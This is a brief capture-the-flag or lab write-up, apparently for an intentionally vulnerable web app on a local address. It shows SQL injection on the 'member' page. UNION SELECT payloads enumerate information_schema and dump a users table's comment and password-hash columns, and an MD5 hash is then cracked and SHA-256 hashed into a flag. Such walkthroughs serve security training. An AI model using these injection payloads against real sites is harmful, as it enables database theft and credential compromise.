# Members

## Testing

If we go to `http://192.168.56.102/index.php?page=member` we can try to do an
SQL injection such as `;` in the input which will give us a error with a mention to MariaDB.

## Exploit

We can now try to search for a list of tables and columns in the database with the input
`1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS`.
We can then observe a definition of a table named `users` wich contains column like
`Commentaire` and `countersign`. If we query those two values with 
`1 UNION SELECT Commentaire, contersign FROM users` we can get the values
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

## Decrypt

We can assume that the countersign is an md5 hash wich will give us the value
`FortyTwo`, then lowered `fortytwo`, and then finally sha256 executed on it
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```
